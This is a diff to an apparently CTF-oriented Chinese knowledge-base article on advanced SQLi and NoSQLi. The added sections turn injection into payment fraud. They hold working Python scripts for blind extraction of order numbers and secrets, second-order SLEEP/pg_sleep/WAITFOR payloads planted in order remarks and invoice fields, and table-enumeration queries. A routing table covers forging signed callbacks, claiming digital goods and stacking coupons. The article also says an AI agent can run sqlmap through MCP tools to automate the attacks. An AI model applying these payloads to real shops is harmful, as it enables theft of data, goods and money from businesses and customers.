@@ -3,14 +3,14 @@ id: "ctf-website/03-injection/sqli-nosqli"
 title: "SQLi & NoSQLi (数据库注入高阶实战)"
 title_en: "Advanced SQLi and NoSQLi Injection"
 summary: >
-  高阶数据库注入实战指南，涵盖 SQLi WAF 绕过技巧（双写、宽字节、注释替代）、无回显盲注并发爆破、NoSQL 注入（MongoDB $regex/$ne 利用）、OOB 数据外带、二次注入、堆叠查询及多数据库专属技巧。包含 Cloud WAF 专项绕过策略。
+  高阶数据库注入实战指南，涵盖 SQLi WAF 绕过技巧（双写、宽字节、注释替代）、无回显盲注并发爆破、NoSQL 注入（MongoDB $regex/$ne 利用）、OOB 数据外带、二次注入、堆叠查询、多数据库专属技巧，以及支付/订单账本场景中的 SQLi 到权益链路。
 summary_en: >
   An advanced guide to database injection covering SQLi WAF bypass techniques (double-writing, wide-byte, comment substitution), blind injection with concurrent brute-forcing, NoSQL injection (MongoDB $regex/$ne exploitation), OOB data exfiltration, second-order injection, stacked queries, and database-specific techniques. Includes Cloud WAF bypass strategies.
 board: "ctf-website"
 category: "03-injection"
-signals: ["SQLi", "NoSQLi", "WAF bypass", "盲注", "MongoDB", "$regex", "OOB", "宽字节"]
+signals: ["SQLi", "NoSQLi", "WAF bypass", "盲注", "MongoDB", "$regex", "OOB", "宽字节", "支付SQLi", "订单表", "账本错位"]
 mcp_tools: ["http_probe", "run_ctf_tool", "kb_router"]
-keywords: ["SQL注入", "NoSQL注入", "MongoDB注入", "WAF绕过", "盲注", "OOB", "sqlmap", "$regex"]
+keywords: ["SQL注入", "NoSQL注入", "MongoDB注入", "WAF绕过", "盲注", "OOB", "sqlmap", "$regex", "支付SQLi", "订单账本"]
 difficulty: "advanced"
 tags: ["injection", "sqli", "nosqli", "waf-bypass", "database", "web-security", "ctf"]
 language: "zh-CN"
@@ -20,9 +20,81 @@ related_articles: []
 
 # SQLi & NoSQLi (数据库注入高阶实战)
 
-数据库注入是 Web 对抗中的经典主线，但在 CTF 和现代 Web 对抗中，我们通常需要面对**过滤器/WAF**、**无回显盲注**以及 **NoSQL（如 MongoDB）** 架构。本指南侧重于高阶利用与 Bypass 策略。
+数据库注入是 Web 对抗中的经典主线，但在 CTF 和现代 Web 对抗中，我们通常需要面对**过滤器/WAF**、**无回显盲注**、**业务账本错位**以及 **NoSQL（如 MongoDB）** 架构。本指南侧重于高阶利用与 Bypass 策略，并把 SQLi 直接接到支付、订单、权益、配置和后台入口。
 
 ---
+
+## 0. 注入到业务账本的路线图
+
+先不要急着 `UNION SELECT database()`。拿到一个注入点后，先判断它落在哪张表、能不能触达业务状态。如果目标是支付类题，最短路径通常不是拖完整库，而是定位 `orders/payments/entitlements/wallet/coupons` 这几张表的字段关系。
+
+| 入口信号 | 第一层目标 | 进阶目标 | 命中标志 |
+|---|---|---|---|
+| URL 参数、GraphQL 参数、搜索框报 SQL 错 | DBMS / 当前库 / 表名 | `orders`, `payments`, `users`, `entitlements` | 表名、列名、订单状态字段可枚举 |
+| 支付回调字段参与查询 | `out_trade_no`, `transaction_id` | 回调绑定任意订单或重复流水 | pending → paid、权益到账 |
+| 优惠券/卡密/邀请码查询 | `coupons`, `cdkeys`, `redeem_logs` | 读未使用码、改 used 状态、重复兑换 | 卡密/优惠券/flag 出现 |
+| 盲注只给真假/时间 | 当前用户、订单号、余额 | 二分提取关键字段，不拖大表 | 稳定前缀推进、ledger diff |
+| NoSQL 登录/筛选 | 用户对象、订单对象 | `$regex` 提取 token / role / order_id | 登录态、订单详情、下载链接 |
+
+```mermaid
+flowchart TD
+  Entry["注入点"] --> Fingerprint["DBMS / 解析器 / 回显 oracle"]
+  Fingerprint --> Schema["表与列: users/orders/payments/entitlements"]
+  Schema --> Extract["抽关键字段: order_id/status/amount/user_id/sign_key"]
+  Extract --> Pay["支付链: 回调/状态机/权益发放"]
+  Pay --> Flag["flag / 卡密 / VIP / 余额"]
+  Extract --> Config["配置链: DB key / APP_KEY / JWT secret"]
+  Config --> Admin["后台 / token / RCE 下一跳"]
+```
+
+### 0.1 支付账本字段优先级
+
+| 优先级 | 字段/表 | 为什么先打 |
+|---|---|---|
+| 1 | `orders(id,out_trade_no,user_id,status,amount,currency)` | 定位订单归属和金额源 |
+| 2 | `payments(order_id,transaction_id,paid_amount,provider,status)` | 找回调和幂等键 |
+| 3 | `entitlements(user_id,order_id,sku,vip_until,download_key)` | 证明权益是否到账 |
+| 4 | `wallet_logs/coupon_logs/refund_logs` | 找余额、优惠和退款分叉 |
+| 5 | `settings/config/options` | 找支付密钥、JWT secret、后台开关 |
+
+### 0.2 最小账本映射脚本
+
+```python
+# ledger_schema_mapper.py — SQLi 结果落到支付账本
+import json
+import re
+from collections import defaultdict
+
+TABLE_HINTS = {
+    "order": re.compile(r"order|trade|invoice|cart", re.I),
+    "payment": re.compile(r"pay|payment|transaction|notify|callback", re.I),
+    "entitlement": re.compile(r"vip|member|license|download|cdkey|card|quota|credit", re.I),
+    "wallet": re.compile(r"wallet|balance|coin|point|coupon|refund", re.I),
+    "config": re.compile(r"config|setting|option|secret|key|token", re.I),
+}
+
+def rank_tables(names):
+    bucket = defaultdict(list)
+    for name in names:
+        for kind, rx in TABLE_HINTS.items():
+            if rx.search(name):
+                bucket[kind].append(name)
+    return dict(bucket)
+
+def next_columns(table):
+    probes = ["id", "user_id", "order_id", "out_trade_no", "status",
+              "amount", "total_fee", "paid_amount", "transaction_id",
+              "sign", "secret", "download_key", "vip_until"]
+    return [f"{table}.{c}" for c in probes]
+
+if __name__ == "__main__":
+    tables = ["users", "orders", "payments", "payment_notify", "entitlements", "system_config"]
+    ranked = rank_tables(tables)
+    print(json.dumps(ranked, ensure_ascii=False, indent=2))
+    for group in ranked.values():
+        for t in group:
+            print(t, "=>", next_columns(t))
+```
 
 ## 1. SQL 注入高级 Bypass 技巧
 
@@ -396,6 +468,175 @@ def session_splice(requests_parts: list[str]):
         session.post(target, data={"q": part})
 ```
 
+## 14. 支付 / 订单 SQLi 专项打法
+
+支付题里的 SQLi 价值不只在“读 flag 表”。更常见的是从一个业务字段进入，拿到订单状态、回调密钥、卡密库存或权益表，再和 `payment-logic.md`、`payment-callback-async.md` 串起来。
+
+### 14.1 表名与列名路由
+
+| DBMS | 表枚举 | 列枚举 | 支付关键词 |
+|---|---|---|---|
+| MySQL/MariaDB | `information_schema.tables` | `information_schema.columns` | `order`, `trade`, `pay`, `notify`, `coupon`, `card`, `vip` |
+| PostgreSQL | `pg_catalog.pg_tables` | `information_schema.columns` | `payment`, `invoice`, `entitlement`, `wallet` |
+| SQLite | `sqlite_master` | `pragma_table_info()` | `orders`, `config`, `cdkeys`, `redeem_logs` |
+| MSSQL | `sys.tables` | `sys.columns` | `transactions`, `licenses`, `settlements` |
+
+```python
+# payment_sqli_probe_plan.py — 根据 DBMS 生成支付表枚举查询
+PAYMENT_WORDS = ["order", "trade", "pay", "payment", "notify", "callback",
+                 "invoice", "coupon", "card", "cdkey", "vip", "wallet",
+                 "balance", "refund", "entitlement", "license"]
+
+def like_clause(col, words, dbms="mysql"):
+    joiner = " OR "
+    if dbms in {"mysql", "postgres", "sqlite"}:
+        return joiner.join(f"LOWER({col}) LIKE '%{w}%'" for w in words)
+    if dbms == "mssql":
+        return joiner.join(f"LOWER({col}) LIKE '%{w}%'" for w in words)
+    return joiner.join(f"{col} LIKE '%{w}%'" for w in words)
+
+def table_queries(dbms):
+    where = like_clause("table_name", PAYMENT_WORDS, dbms)
+    return {
+        "mysql": f"SELECT table_schema,table_name FROM information_schema.tables WHERE {where}",
+        "postgres": f"SELECT table_schema,table_name FROM information_schema.tables WHERE {where}",
+        "sqlite": "SELECT name FROM sqlite_master WHERE type='table' AND (" + like_clause("name", PAYMENT_WORDS, dbms) + ")",
+        "mssql": f"SELECT name FROM sys.tables WHERE {like_clause('name', PAYMENT_WORDS, dbms)}",
+    }[dbms]
+
+for dbms in ["mysql", "postgres", "sqlite", "mssql"]:
+    print(dbms, "=>", table_queries(dbms))
+```
+
+### 14.2 盲注只抽“能推动状态”的字段
+
+无回显场景不要拖全表。支付链通常只需要这些字段：
+
+```text
+orders:        id, out_trade_no, user_id, amount, currency, status
+payments:      order_id, transaction_id, provider, paid_amount, status, raw_notify
+entitlements:  user_id, order_id, sku, license_key/download_key, vip_until
+settings:      pay_secret, webhook_secret, jwt_secret, app_key
+```
+
+```python
+# blind_payment_field_extract.py — 针对单字段二分，输出可直接接支付链的 JSON
+import json
+import string
+import requests
+
+BASE = "https://target"
+PARAM = "id"
+S = requests.Session()
+ALPHABET = string.ascii_letters + string.digits + "_-{}@.:"
+
+def oracle(payload):
+    r = S.get(BASE + "/api/order", params={PARAM: payload}, timeout=10)
+    return "order not found" not in r.text.lower() and r.status_code != 500
+
+def char_at(expr, pos):
+    for ch in ALPHABET:
+        payload = f"1 AND SUBSTR(({expr}) FROM {pos} FOR 1)='{ch}'"
+        if oracle(payload):
+            return ch
+    return ""
+
+def extract(expr, max_len=64):
+    out = ""
+    for pos in range(1, max_len + 1):
+        c = char_at(expr, pos)
+        if not c:
+            break
+        out += c
+        print(out)
+    return out
+
+target = "SELECT out_trade_no FROM orders WHERE user_id=(SELECT id FROM users WHERE username='admin') LIMIT 1"
+value = extract(target)
+print(json.dumps({"field": "orders.out_trade_no", "value": value}, ensure_ascii=False))
+```
+
+### 14.3 SQLi 转支付链决策表
+
+| 已抽到的字段 | 立即尝试 | 下一跳文档 |
+|---|---|---|
+| `out_trade_no/order_id` | 回调绑定、订单 IDOR、发货接口 | `../12-payment/payment-logic.md` |
+| `pay_secret/webhook_secret` | 生成合法签名回调 | `../12-payment/payment-callback-async.md` |
+| `transaction_id/notify_id` | 重放、大小写/空白变体、跨订单复用 | `../12-payment/payment-callback-async.md` |
+| `license_key/download_key` | 直接领取数字商品、枚举邻近 key | `../12-payment/payment-digital-goods.md` |
+| `coupon_code/balance` | 优惠券叠加、余额负数、退款残留 | `../12-payment/payment-bypass.md` |
+| `admin password hash/JWT secret` | 登录后台、签 token、触发管理发货 | `../02-auth/jwt/03-weak-key-bruteforce.md` |
+
+### 14.4 二阶 SQLi 打支付回调
+
+二阶注入在支付里特别常见：订单备注、发票抬头、收货信息、兑换码备注先入库，稍后被对账、邮件、回调日志或后台查询再次拼 SQL。
+
+```python
+# second_order_payment_sqli.py — 写入订单字段，触发后台/回调二次查询
+import time
+import requests
+
+BASE = "https://target"
+S = requests.Session()
+
+SLEEP_PAYLOADS = [
+    "x' OR SLEEP(4)-- ",
+    "x'; SELECT pg_sleep(4)--",
+    "x'; WAITFOR DELAY '00:00:04'--",
+]
+
+SINKS = [
+    "/api/order/create",
+    "/api/invoice/create",
+    "/api/coupon/redeem",
+]
+
+TRIGGERS = [
+    "/api/orders/{order_id}",
+    "/api/payment/notify",
+    "/admin/orders/search?q={marker}",
+    "/api/invoice/export?order_id={order_id}",
+]
+
+def post_marker(path, marker):
+    r = S.post(BASE + path, json={
+        "product_id": 1,
+        "amount": "0.01",
+        "remark": marker,
+        "invoice_title": marker,
+        "coupon_code": marker,
+    }, timeout=10)
+    try:
+        return r.json().get("order_id") or r.json().get("data", {}).get("order_id")
+    except Exception:
+        return None
+
+for payload in SLEEP_PAYLOADS:
+    order_id = post_marker("/api/order/create", payload)
+    for tpl in TRIGGERS:
+        path = tpl.format(order_id=order_id or "1", marker="x")
+        t0 = time.perf_counter()
+        r = S.get(BASE + path, timeout=12) if "notify" not in path else S.post(BASE + path, json={"order_id": order_id}, timeout=12)
+        dt = time.perf_counter() - t0
+        print(payload[:20], path, r.status_code, f"{dt:.2f}s")
+```
+
+### 14.5 成功 / 失败样本
+
+成功样本：
+
+- 盲注稳定抽出 `orders.out_trade_no`，随后用同一订单号触发回调状态差异。
+- 抽出 `pay_secret` 后生成签名，notify 响应从 `invalid sign` 变成 `success`，订单/权益前后状态变化。
+- 二阶 payload 写入订单备注后，后台搜索或发票导出出现可重复延迟/报错，确认二次拼接点。
+- NoSQL `$regex` 抽出管理员 `api_key`，再调用订单管理接口发货。
+
+失败样本：
+
+- 注入只能读公开搜索索引，无法触达业务库。
+- 表名可枚举但订单/权益字段全部按当前用户过滤。
+- pay secret 存在但签名规范化不同，回调仍拒绝。
+- 时间盲注噪声大于 sleep 差值，无法稳定判定。
+
 ## Evidence
 
 - `oracle_pairs.json`: True/False payload、状态码、长度、hash、marker 差异。
@@ -403,6 +644,8 @@ def session_splice(requests_parts: list[str]):
 - `tamper_matrix.csv`: 原始 payload、变体、变形层、WAF 响应、DB 执行信号。
 - `oob_logs.jsonl`: DNS/HTTP label、chunk 序号、还原后的字段值。
 - `second_order_flow.md`: 写入请求、落库形态、触发请求、报错/延迟/数据输出。
+- `payment_ledger_map.json`: 表名、列名、订单号、支付流水、权益字段、下一跳路径。
+- `callback_from_sqli.json`: 由 SQLi 抽出的密钥/订单号生成的回调请求与状态 diff。
 - 成功样本: 可重复抽出 DBMS 指纹、表/列/flag；或 NoSQL 正则稳定推进前缀。
 - 失败样本: 真假响应无稳定差异、时间噪声覆盖 delay、OOB 无回连、二阶触发点不使用写入字段。
 
@@ -415,4 +658,5 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 | 探测注入点 | `http_probe` | HTTP GET 探测参数 |
 | SQL 注入自动化 | `run_ctf_tool sqlmap --args "--batch --dbs"` | 自动检测+利用 SQLi |
 | 按信号查技术 | `kb_router` | 搜索 sqli 相关技术文件 |
+| 支付链路路由 | `kb_router` | SQLi 抽到订单/密钥/权益字段后跳转支付文档 |
 
